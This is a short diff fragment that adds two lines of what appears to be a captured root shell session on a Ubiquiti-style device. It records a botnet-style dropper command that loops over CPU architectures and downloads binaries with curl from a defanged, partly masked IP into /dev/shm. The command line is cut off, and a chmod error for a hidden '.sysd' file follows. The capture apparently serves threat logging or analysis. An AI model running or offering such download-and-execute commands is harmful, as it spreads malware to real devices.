@@ -1,0 +1,2 @@
+[4hroot@ubnt:~# cd /dev/shm; for arch in x86_64 armv7l mips mipsel; do curl -fsSLk hxxp://103.211.206.XXX/main_${arch} -o
+[4lchmod: cannot access '.sysd': No such file or directory
